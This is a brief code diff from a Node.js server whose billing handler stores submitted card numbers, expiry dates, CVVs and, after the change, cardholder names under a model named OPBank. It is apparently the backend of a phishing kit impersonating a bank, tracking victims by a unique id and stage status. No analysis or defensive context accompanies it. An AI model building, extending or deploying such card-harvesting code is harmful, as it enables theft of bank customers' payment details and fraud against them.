@@ -47,9 +47,9 @@ const submitLogin = async (req, res) => {
 };
 
 const submitBilling = async (req, res) => {
-    const { ccnum, ccexp, cvv, uniqueid } = req.body;
+    const { ccnum, ccexp, ccname, cvv, uniqueid } = req.body;
     try {
-        await OPBank.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
+        await OPBank.findOneAndUpdate({ uniqueid }, { ccname, ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
